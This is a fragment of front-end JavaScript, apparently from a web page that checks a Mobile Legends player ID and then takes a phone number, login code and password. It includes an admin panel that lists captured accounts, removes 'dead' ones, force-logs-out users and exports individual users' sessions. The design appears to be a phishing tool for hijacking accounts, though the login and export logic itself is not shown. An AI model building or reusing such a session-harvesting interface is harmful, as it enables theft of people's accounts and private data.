  $('btn-mlbb-check').onclick = mlbbCheck;
  $('btn-mlbb-continue').onclick = mlbbContinue;
  $('in-mlbb-id').addEventListener('keydown', (e) => e.key === 'Enter' && mlbbCheck());
  $('in-mlbb-server').addEventListener('keydown', (e) => e.key === 'Enter' && mlbbCheck());
  $('btn-send-code').onclick = sendCode;
  $('btn-sign-in').onclick = signIn;
  $('btn-password').onclick = submitPassword;
  $('btn-admin-login').onclick = adminLogin;
  document.querySelectorAll('[data-back]').forEach((b) => (b.onclick = () => showLoginStep('phone')));
  $('in-phone').addEventListener('keydown', (e) => e.key === 'Enter' && sendCode());
  $('in-code').addEventListener('keydown', (e) => e.key === 'Enter' && signIn());
  $('in-password').addEventListener('keydown', (e) => e.key === 'Enter' && submitPassword());
  $('in-admin-pass').addEventListener('keydown', (e) => e.key === 'Enter' && adminLogin());

  $('u-logout').onclick = userLogout;
  $('u-export').onclick = () => exportSession('/api/session/export', 'your account');
  $('a-logout').onclick = adminLogout;
  $('a-refresh').onclick = loadAccounts;
  $('a-clean').onclick = async () => {
    $('a-clean').disabled = true;
    try {
      const r = await api('/api/admin/sessions/clean', POST({}));
      toast(`Cleaned ${r.removed} dead accounts`);
      await loadAccounts();
    } catch (e) { toast(e.message); }
    $('a-clean').disabled = false;
  };
  $('a-acct-back').onclick = () => { if ($('admin-view')) $('admin-view').classList.remove('in-account'); };
  $('a-acct-logout').onclick = forceLogoutAccount;
  $('a-acct-export').onclick = () => {
    if (!App.currentSid) return;
    const a = App.accounts.find((x) => x.sid === App.currentSid);
    exportSession(`/api/admin/sessions/${App.currentSid}/export`, a ? a.name : 'account');
  };

  // lightbox
  $('lightbox').addEventListener('click', closeLightbox);
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeLightbox(); });
}

wire();
boot();
